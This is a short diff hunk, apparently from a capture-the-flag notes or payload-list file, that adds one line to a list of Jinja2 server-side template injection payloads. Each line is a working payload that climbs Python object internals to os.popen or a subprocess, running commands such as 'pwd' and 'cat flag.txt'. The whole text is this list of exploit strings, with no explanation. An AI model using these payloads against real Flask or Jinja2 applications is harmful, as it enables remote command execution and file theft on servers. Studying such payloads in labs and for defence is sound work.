@@ -13,6 +13,7 @@
 {{ ''.__class__.__mro__[1].__subclasses__()[408]\('pwd',stdout=-1).communicate() }}
 ```
 ```
+{{ url_for.__globals__.os.popen("cat flag.txt").read() }}
 {{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}
 ```
